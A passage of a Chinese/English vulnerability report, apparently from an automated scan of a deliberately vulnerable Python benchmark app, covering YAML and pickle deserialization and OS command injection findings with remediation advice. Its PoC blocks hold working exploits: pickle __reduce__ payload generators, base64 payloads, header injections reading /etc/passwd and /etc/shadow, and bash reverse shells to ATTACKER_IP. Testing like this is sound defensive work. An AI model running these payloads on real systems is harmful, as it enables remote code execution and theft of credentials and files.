+  · 动态：✅ 已复现 — 1. Dynamic RCE confirmed: POST request with payload '!!python/object/apply:os.system ["touch /tmp/pwned_BenchmarkTest00270"]: ignored\ntext: ' to /benchmark/deserialization-00/BenchmarkTest00270 resulted in the file /tmp/pwned_BenchmarkTest00270 being created (verified by ls -la /tmp/pwned_BenchmarkTest00270).
+2. Command execution as root: POST with '!!python/object/apply:os.system ["id > /tmp/id_output.txt"]: ignored\ntext: ' produced /tmp/id_output.txt containing 'uid=0(root) gid=0(root) groups=0(root)'.
+3. Successful YAML deserialization confirmed by response returning '_SafeStuff' (the value of yobj['text']), proving the YAML was parsed without error despite the appended suffix.
+4. The response 'There was an error loading the configuration' is returned only when YAML parsing fails - successful parsing returns the value of yobj['text'].
+
+**PoC**：
+```
+# RCE via YAML Insecure Deserialization
+# The _SafeStuff suffix is bypassed by using a YAML mapping where:
+# - The dangerous tag (as mapping key) gets evaluated, executing the command
+# - _SafeStuff becomes the value of the 'text' key, making valid YAML
+
+# Command execution (os.system):
+curl -X POST 'https://localhost:8443/benchmark/deserialization-00/BenchmarkTest00270' \
+  -d 'BenchmarkTest00270=!!python/object/apply:os.system ["touch /tmp/exploit_confirmed"]: ignored
+text: ' -k
+
+# Command with output capture (using subprocess.check_output to exfiltrate):
+curl -X POST 'https://localhost:8443/benchmark/deserialization-00/BenchmarkTest00270' \
+  -d 'BenchmarkTest00270=!!python/object/apply:os.system ["id > /tmp/id_out"]: ignored
+text: ' -k
+
+# Key elements:
+# 1. Route: POST /benchmark/deserialization-00/BenchmarkTest00270
+# 2. Parameter name: BenchmarkTest00270 (from request.form.getlist)
+# 3. The %0a (newline) in the form value makes _SafeStuff appear on its own line
+# 4. The YAML mapping absorbs _SafeStuff as the value for key 'text'
+```
+
+**修复建议**：1. Replace yaml.load() with yaml.safe_load() which only deserializes safe Python types (dict, list, str, int, float, bool, None). yaml.Loader (the default/unsafe loader) must never be used with untrusted input.
+2. Alternatively, use a safer serialization format like JSON for untrusted data.
+3. Never pass user-controlled data directly to deserialization libraries that support arbitrary object instantiation.
+
+### 2.21 Insecure Deserialization — testcode/BenchmarkTest00433.py:47
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00433.py:47` (函数 `BenchmarkTest00433_post`)
+  · source：`testcode/BenchmarkTest00433.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00433.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00433.py:39` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00433.py:47` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00433_post@testcode/BenchmarkTest00433.py:28
+
+**④ 验证**：静态判定 `confirmed` — Confirmed by dynamic reproduction. The endpoint /benchmark/deserialization-00/BenchmarkTest00433 accepts user-controlled form field names, passes them through a dict lookup, and feeds them directly into yaml.load(bar, Loader=yaml.Loader). The full YAML Loader deserializes arbitrary Python objects, enabling remote code execution. Multiple payloads were verified: (1) os.system('touch /tmp/benchmark_pwned') created a file on the server, (2) os.system('cat /etc/passwd > /tmp/passwd_output') read sensitive system files, (3) eval("{'text': 'RCE_SUCCESS'}") returned controlled output in the response. The vulnerability is CWE-502 (Insecure Deserialization) via YAML (not pickle as initially suspected), with full RCE impact.
+  · 动态：✅ 已复现 — 1. `yaml.load(bar, Loader=yaml.Loader)` on line 46 with user-controlled input confirmed via code reading
+2. Simple dict payload `{text: hello}` returned "hello" in response — confirms YAML parsing works
+3. `os.system` payload `!!python/object/apply:os.system {args: [touch /tmp/benchmark_pwned]}` created file `/tmp/benchmark_pwned` on server (verified via `ls -la /tmp/benchmark_pwned`)
+4. `cat /etc/passwd > /tmp/passwd_output` successfully exfiltrated the passwd file
+5. `eval("{'text': 'RCE_SUCCESS'}")` returned "RCE_SUCCESS" in HTTP response body — confirms arbitrary Python code execution
+6. No authentication required; endpoint is publicly accessible
+
+**PoC**：
+```
+```bash
+# PoC 1: Execute arbitrary command (touch file)
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
+  -d '!!python/object/apply:os.system {args: [touch /tmp/pwned]}=BenchmarkTest00433'
+
+# PoC 2: Read sensitive files (output written to file)
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
+  -d '!!python/object/apply:os.system {args: [cat /etc/passwd > /tmp/out]}=BenchmarkTest00433'
+
+# PoC 3: Direct output in response via eval
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
+  -d "!!python/object/apply:builtins.eval {args: [\"{'text': 'INJECTION_SUCCESS'}\"]}=BenchmarkTest00433"
+
+# PoC 4: Reverse shell (adjust IP/PORT)
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00433' \
+  -d '!!python/object/apply:os.system {args: [bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]}=BenchmarkTest00433'
+```
+```
+
+**修复建议**：Replace `yaml.load(bar, Loader=yaml.Loader)` with `yaml.safe_load(bar)` on line 46 of testcode/BenchmarkTest00433.py. The `yaml.Loader` (full loader) deserializes arbitrary Python objects, enabling RCE via tags like `!!python/object/apply:os.system`, `!!python/object/apply:builtins.eval`, etc. `yaml.safe_load()` only handles standard YAML types (dicts, lists, scalars) and cannot deserialize arbitrary Python objects.
+
+### 2.22 Insecure Deserialization — testcode/BenchmarkTest00507.py:55
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00507.py:55` (函数 `BenchmarkTest00507_post`)
+  · source：`testcode/BenchmarkTest00507.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00507.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00507.py:43` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00507.py:55` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00507_post@testcode/BenchmarkTest00507.py:28
+
+**④ 验证**：静态判定 `confirmed` — Code evidence + runtime reproduction both confirm the vulnerability. The Flask endpoint reads user-controlled input from the 'BenchmarkTest00507' HTTP header, passes it through a trivial case-match (always case 'A' which assigns bar=param), base64-urlsafe-decodes it, and feeds it directly into pickle.loads() with no sanitization or restriction. Crafting a malicious pickle payload with os.system as __reduce__ results in arbitrary command execution on the server.
+  · 动态：✅ 已复现 — 1. Code analysis: testcode/BenchmarkTest00507.py:55 calls pickle.loads(base64.urlsafe_b64decode(bar)) where bar is directly user-controlled via request.headers.get('BenchmarkTest00507')
+2. Runtime reproduction: Sent malicious pickle payload with os.system('touch /tmp/pwned_by_pickle') → file was created (confirmed via ls -la)
+3. Full RCE demonstrated: Sent payload executing 'id > /tmp/pwned_output && hostname >> /tmp/pwned_output && cat /etc/passwd >> /tmp/pwned_output' → read output showed 'uid=0(root)' and server hostname
+4. Works via both GET and POST methods
+5. No authentication required - endpoint is fully public
+
+**PoC**：
+```
+# Step 1: Generate the malicious pickle payload
+python3 -c "
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+payload = pickle.dumps(RCE())
+encoded = base64.urlsafe_b64encode(payload).decode()
+print(encoded)
+"
+
+# Step 2: Send it via GET or POST
+curl -X POST http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00507 \
+  -H 'BenchmarkTest00507: <encoded_payload>'
+
+# Or via GET (same result):
+curl http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00507 \
+  -H 'BenchmarkTest00507: <encoded_payload>'
+
+# For reverse shell: replace os.system('id') with os.system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')
+```
+
+**修复建议**：Never use pickle.loads() on untrusted data. Pickle deserialization is inherently unsafe - it can execute arbitrary code during unpickling. Remediations:
+1. Use a safe serialization format like JSON (json.loads) instead of pickle for untrusted inputs.
+2. If pickle is required for internal use only, validate the input against an allow-list of safe classes before deserializing.
+3. At minimum, implement HMAC signing on pickled data to detect tampering.
+4. Consider using `pickle.Unpickler` with restrictive `find_class` override to limit which classes can be instantiated.
+
+### 2.23 OS Command Injection — testcode/BenchmarkTest00511.py:57
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00511.py:57` (函数 `BenchmarkTest00511_post`)
+  · source：`testcode/BenchmarkTest00511.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00511.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00511.py:44` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00511.py:57` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00511_post@testcode/BenchmarkTest00511.py:28
+
+**④ 验证**：静态判定 `confirmed` — 漏洞完全成立且已在运行的应用上成功复现。污点路径清晰：request.headers.get("BenchmarkTest00511") (line 31) → 经列表操作赋值给 bar (line 42) → f"echo {bar}" 直接插值到 shell 命令 (line 55) → subprocess.run(capture_output=True) 执行 (line 57)。没有任何净化或转义步骤。实际测试中，发送 Header: BenchmarkTest00511: ; id 成功执行 id 命令并返回 uid=0(root)；发送 ; cat /etc/passwd 成功转储系统密码文件。
+  · 动态：✅ 已复现 — 1. 代码证据：testcode/BenchmarkTest00511.py:55 argList.append(f"echo {bar}") — bar 直接来自请求头，无任何净化
+2. 运行时证据：发送 Header "BenchmarkTest00511: ; id" 返回 "uid=0(root) gid=0(root) groups=0(root)"，证明任意命令可执行
+3. 运行时证据：发送 Header "BenchmarkTest00511: ; cat /etc/passwd" 成功转储系统密码文件（20+ 用户条目）
+4. 应用以 root 权限运行（uid=0），影响为完全的系统级远程代码执行
+
+**PoC**：
+```
+# 命令执行：注入分号分隔的命令（无需鉴权）
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00511' \
+  -H 'BenchmarkTest00511: ; id'
+
+# 读取任意文件
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00511' \
+  -H 'BenchmarkTest00511: ; cat /etc/passwd'
+
+# 反向 shell 或其它任意命令均可行
+```
+
+**修复建议**：1. 永远不要将用户可控输入直接拼接到 shell 命令中。对于 echo 操作，应使用 Python 原生方式（如直接 print），而非通过 shell 子进程。
+2. 如果必须使用 subprocess 执行命令，应使用参数列表形式（不经过 shell 解释），例如 subprocess.run(["echo", bar])，这样 bar 仅作为字面参数传递，不会被 shell 解释执行。
+3. 对用户输入实施严格的输入验证，仅允许预期的字符集（如字母数字）。
+4. 实施最小权限原则，应用不应以 root 权限运行。
+
+### 2.24 OS Command Injection — testcode/BenchmarkTest00606.py:51
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00606.py:51` (函数 `BenchmarkTest00606_post`)
+  · source：`testcode/BenchmarkTest00606.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00606.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00606.py:41` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00606.py:51` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00606_post@testcode/BenchmarkTest00606.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码审计与动态测试双重确认。源码第32-35行从HTTP请求头'BenchmarkTest00606'读取用户可控输入，无任何净化或校验直接传递到第48行，通过f-string拼接至shell命令字符串，并在第51行以shell=True执行。动态测试中：①发送payload 'hello; id' → 返回 uid=0(root) gid=0(root) groups=0(root)；②发送'test; cat /etc/hostname' → 返回主机名'4d45295537b6'；③发送'test; ls -la /etc/passwd' → 返回文件列表。无需鉴权，任意攻击者可远程执行任意OS命令。
+  · 动态：✅ 已复现 — 1. 源码证据：第48行 `argStr += f"echo {bar}"` — 直接拼接用户头输入到shell命令；第51行 `subprocess.run(argStr, shell=True)` — 以shell模式执行。  
+2. 动态复现证据：  
+   - 请求 `BenchmarkTest00606: hello; id` → 响应中包含 `uid=0(root) gid=0(root) groups=0(root)`  
+   - 请求 `BenchmarkTest00606: test; cat /etc/hostname` → 响应中包含容器主机名 `4d45295537b6`  
+   - 请求 `BenchmarkTest00606: test; ls -la /etc/passwd` → 响应中包含 `/etc/passwd` 文件信息  
+3. 该端点无需任何鉴权，攻击面为完整网络（AV:N / PR:N / UI:N）。
+
+**PoC**：
+```
+# 方式1：通过分号注入（最简PoC）
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
+  -H 'BenchmarkTest00606: hello; id'
+
+# 方式2：通过子命令注入（shell注入）
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
+  -H 'BenchmarkTest00606: $(id)'
+
+# 方式3：通过反引号注入
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
+  -H 'BenchmarkTest00606: `id`'
+
+# 方式4：读取任意文件
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
+  -H 'BenchmarkTest00606: test; cat /etc/shadow'
+
+# 方式5：GET方式同样受影响
+curl 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00606' \
+  -H 'BenchmarkTest00606: hello; whoami'
+```
+
+**修复建议**：1. 【首选·彻底修复】禁止直接拼接用户输入到shell命令。将用户的bar参数通过subprocess.run的参数列表传递（不使用shell=True），或将echo命令完全替换为Python内置的print/日志功能。  
+2. 【输入净化】若必须使用shell=True，对bar进行严格转义：使用shlex.quote(bar)阻止shell元字符解析。  
+3. 【架构加固】移除shell=True，改用subprocess.run(['echo', bar], ...)以参数列表形式传递，确保用户输入不被shell解释器解析为命令。  
+4. 【额外防护】启用最小权限运行（容器内已以root运行，应降权），并对请求头大小/字符集做限制。
+
+### 2.25 Insecure Deserialization — testcode/BenchmarkTest00510.py:46
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00510.py:46` (函数 `BenchmarkTest00510_post`)
+  · source：`testcode/BenchmarkTest00510.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00510.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00510.py:38` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00510.py:46` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00510_post@testcode/BenchmarkTest00510.py:28
+
+**④ 验证**：静态判定 `confirmed` — 该漏洞经过完整代码审阅和运行时复现，确认为真实 RCE。代码中第31行从HTTP请求头"BenchmarkTest00510"获取用户输入，第37行赋值给bar（三元表达式条件恒为false，bar=param），第46行直接对输入进行base64-urlsafe解码后送入pickle.loads()反序列化，无任何净化。已成功构造恶意pickle载荷实现远程命令执行（创建文件、读取/etc/passwd）。
+  · 动态：✅ 已复现 — 1. **代码确认**：testcode/BenchmarkTest00510.py L46: pickle.loads(base64.urlsafe_b64decode(bar))，bar来自HTTP请求头BenchmarkTest00510（L31），经L37赋值（三元表达式条件(7*42-106=188)>200恒为false，bar=param），无任何净化。
+2. **运行时复现**：
+   - 发送恶意pickle载荷 → 返回"shared string is no pickles to be seen here"（反序列化成功，未触发异常分支）
+   - 验证文件 /tmp/pwned_pickle 内容为 "uid=0(root) gid=0(root) groups=0(root)" ✅ RCE确认
+   - 进一步读取 /etc/passwd 成功，文件 /tmp/passwd_exfil 大小为839字节 ✅ 文件读取确认
+3. **入口无需鉴权**：该端点公开可访问。
+
+**PoC**：
+```
+# 构造恶意pickle载荷并发送（Python脚本）
+python3 -c "
+import pickle, base64, os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('YOUR_COMMAND_HERE',))
+
+payload = pickle.dumps(RCE())
+encoded = base64.urlsafe_b64encode(payload).decode()
+print(f'Payload: {encoded}')
+"
+
+# 发送请求（示例：执行 id > /tmp/pwned）
+curl -X POST 'http://<TARGET>:8443/benchmark/deserialization-00/BenchmarkTest00510' \
+  -H 'BenchmarkTest00510: gASVMQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBZpZCA-IC90bXAvcHduZWRfcGlja2xllIWUUpQu'
+
+# 简易One-liner验证
+python3 -c "
+import pickle,base64,os
+class X:__reduce__=lambda s:(os.system,('id>/tmp/pwned',))
+print(base64.urlsafe_b64encode(pickle.dumps(X())).decode())
+" | xargs -I{} curl -X POST 'http://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00510' -H 'BenchmarkTest00510: {}'
+```
+
+**修复建议**：1. **永远不要对不可信数据使用pickle.loads()**。pickle设计上就是不安全的，即使加了签名验证也无法防御pickle本身的功能滥用。
+2. 改用安全的序列化格式替代pickle，如：JSON (json.loads)、YAML（使用安全解析器如yaml.safe_load）、MessagePack等。
+3. 若必须使用pickle，应采用白名单方式限制可加载的类型，或考虑通过数字签名验证来源。但最佳实践是完全避免pickle处理外部输入。
+4. 该端点是对外公开的，没有任何身份认证，进一步放大了风险面。
+
+### 2.26 Insecure Deserialization — testcode/BenchmarkTest00605.py:47
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00605.py:47` (函数 `BenchmarkTest00605_post`)
+  · source：`testcode/BenchmarkTest00605.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00605.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00605.py:39` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00605.py:47` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00605_post@testcode/BenchmarkTest00605.py:28
+
+**④ 验证**：静态判定 `confirmed` — 漏洞链完整闭合：用户可控 HTTP 头 BenchmarkTest00605 → escape_for_html() 净化不充分（保留 URL-safe base64 字符 A-Za-z0-9._-） → base64.urlsafe_b64decode → pickle.loads() 执行任意代码。已在沙箱中两次实弹复现 RCE（touch 创建文件 + cat 读取主机名），确凿无误。
+  · 动态：✅ 已复现 — (1) 发送 payload 后应用返回 'shared string is no pickles to be seen here'（表示 pickle.loads() 未抛异常，成功执行）；(2) touch /tmp/pwned 后文件存在（0字节）；(3) cat /etc/hostname>/tmp/hn 后文件内容为 '4d45295537b6'（容器主机名）。三次独立请求均验证 RCE。
+
+**PoC**：
+```
+# Python生成payload：
+python3 -c "
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('touch /tmp/exploited',))
+payload = pickle.dumps(RCE())
+encoded = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()
+assert len(encoded) % 4 == 0, 'base64 length must be multiple of 4'
+print(encoded)
+"
+
+# 发送利用请求（取上面输出的encoded值）：
+curl -k -X POST 'https://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00605' \
+  -H 'BenchmarkTest00605: gASVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu' \
+  -d 'dummy=1'
+
+# 验证：响应应为"shared string is no pickles to be seen here"，且 touch 的目标文件存在
+```
+
+**修复建议**：1. 永远不要使用 pickle.loads() 处理不可信数据。pickle 设计上就不安全，反序列化时执行任意代码。2. 改用安全序列化格式如 JSON（json.loads）并通过 schema 验证。3. 如需使用 pickle，必须在反序列化前进行 HMAC 签名验证，确保数据来自可信源。4. 删除或移除当前对 unsafe_b64decode+pickle.loads 的调用路径。
+
+### 2.27 Insecure Deserialization — testcode/BenchmarkTest00734.py:46
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00734.py:46` (函数 `BenchmarkTest00734_post`)
+  · source：`testcode/BenchmarkTest00734.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00734.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00734.py:38` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00734.py:46` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00734_post@testcode/BenchmarkTest00734.py:28
+
+**④ 验证**：静态判定 `confirmed` — Confirmed via dynamic reproduction with two payloads: (1) `touch /tmp/pwned_by_pickle` created file, (2) `cat /etc/passwd > /tmp/passwd_exfil` successfully exfiltrated system file. Both payloads executed with no errors. The attempted defense `html.escape()` has zero effect on base64-urlsafe characters (A-Za-z0-9_-=), making it completely ineffective.
+  · 动态：✅ 已复现 — 1. `/tmp/pwned_by_pickle` file created (0 bytes) after sending malicious pickle payload via GET request.
+2. `/tmp/passwd_exfil` contains contents of `/etc/passwd` after sending a second payload.
+3. `html.escape()` verified to have zero effect on base64-urlsafe character set (A-Za-z0-9_-=).
+4. Application response "shared string is no pickles to be seen here" confirms pickle.loads() succeeded without exception.
+
+**PoC**：
+```
+# For any command execution, craft a pickle RCE payload:
+python3 -c "
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('COMMAND',))
+b64 = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
+print(b64)
+"
+# Then send:
+curl -s 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00734?BenchmarkTest00734=<b64_payload>'
+
+# Example - read /etc/passwd:
+curl -s 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00734?BenchmarkTest00734=gASVPgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCNjYXQgL2V0Yy9wYXNzd2QgPiAvdG1wL3Bhc3N3ZF9leGZpbJSFlFKULg=='
+```
+
+**修复建议**：1. Never use pickle.loads() on untrusted data. Python pickle is fundamentally insecure against deserialization attacks.
+2. Use a safe serialization format like JSON (json.loads) instead.
+3. If custom deserialization is required, implement cryptographic signing/verification (e.g., HMAC with a secret key) to ensure data integrity.
+4. Remove the `html.escape()` call as it provides no security benefit here and gives a false sense of protection.
+
+### 2.28 Insecure Deserialization — testcode/BenchmarkTest00735.py:46
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00735.py:46` (函数 `BenchmarkTest00735_post`)
+  · source：`testcode/BenchmarkTest00735.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00735.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00735.py:38` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00735.py:46` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00735_post@testcode/BenchmarkTest00735.py:28
+
+**④ 验证**：静态判定 `confirmed` — CWE-502 Insecure Deserialization fully confirmed with dynamic RCE reproduction. User-supplied input (query parameter 'BenchmarkTest00735') is base64-urlsafe-decoded and passed directly to pickle.loads() without any effective sanitization. The markupsafe.escape() call before decoding is ineffective because base64-urlsafe characters (A-Z, a-z, 0-9, -, _, =) do not include any HTML-sensitive characters that escape() would transform. Multiple commands were executed on the server: 'id > /tmp/pwned.txt' (output: uid=0(root)) and 'cat /etc/passwd > /tmp/passwd_out.txt' (successfully read system passwords). The endpoint is publicly accessible with no authentication required.
+  · 动态：✅ 已复现 — 1) Code analysis: testcode/BenchmarkTest00735.py line 46 calls pickle.loads(base64.urlsafe_b64decode(bar)) where 'bar' originates from the unsanitized query parameter 'BenchmarkTest00735' (line 31). The markupsafe.escape() on line 37 does not affect base64-urlsafe characters. 2) Dynamic confirmation: Sending malicious pickle payload resulted in response "shared string is no pickles to be seen here" (indicating successful deserialization) instead of "Unpickling failed!". 3) RCE verified: cat /tmp/pwned.txt showed "uid=0(root) gid=0(root) groups=0(root)" proving the 'id' command was executed on the server.
+
+**PoC**：
+```
+# Step 1: Generate malicious pickle payload
+python3 -c "
+import pickle, base64, os, sys
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('COMMAND_HERE',))
+
+payload = pickle.dumps(RCE())
+sys.stdout.write(base64.urlsafe_b64encode(payload).decode())
+"
+
+# Step 2: Send to the vulnerable endpoint
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00735?BenchmarkTest00735=<ENCODED_PAYLOAD>'
+
+# Example: Execute 'id' command
+curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00735?BenchmarkTest00735=gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNpZCA-IC90bXAvcHduZWQudHh0lIWUUpQu'
+
+# Also works with GET:
+curl 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00735?BenchmarkTest00735=gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNpZCA-IC90bXAvcHduZWQudHh0lIWUUpQu'
+```
+
+**修复建议**：Never deserialize untrusted data with pickle.loads(). Replace pickle with a safe serialization format such as JSON (json.loads/json.dumps). If deserialization of complex objects is required, use a safe alternative like marshmallow or pydantic schemas with explicit validation. If pickle must be used (e.g., for inter-process communication), do not accept pickled data from any untrusted source (network requests, user input, external files). Additionally, consider using a sandbox, signature verification, or a restricted unpickler.
+
+### 2.29 Insecure Deserialization — testcode/BenchmarkTest00825.py:47
+
+- **类型**：CWE-502 Insecure Deserialization
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00825.py:47` (函数 `BenchmarkTest00825_post`)
+  · source：`testcode/BenchmarkTest00825.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00825.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00825.py:39` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00825.py:47` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00825_post@testcode/BenchmarkTest00825.py:28
+
+**④ 验证**：静态判定 `confirmed` — 漏洞完全确认并动态复现。第47行将用户输入的查询参数 BenchmarkTest00825 经 base64 url-safe 解码后直接传入 pickle.loads()，无任何净化/校验。pickle.loads() 在反序列化过程中会执行对象内的 __reduce__ 方法，导致任意命令执行。成功验证：(1) touch /tmp/pwned_by_pickle → 文件被创建；(2) id > /tmp/id_output → 输出显示uid=0(root)；(3) cat /etc/passwd > /tmp/passwd_output → 系统密码文件被读取。三者均成功。
+  · 动态：✅ 已复现 — 1. 文件创建：POST 发送 pickle payload → /tmp/pwned_by_pickle 被创建（确认 os.system 执行）  
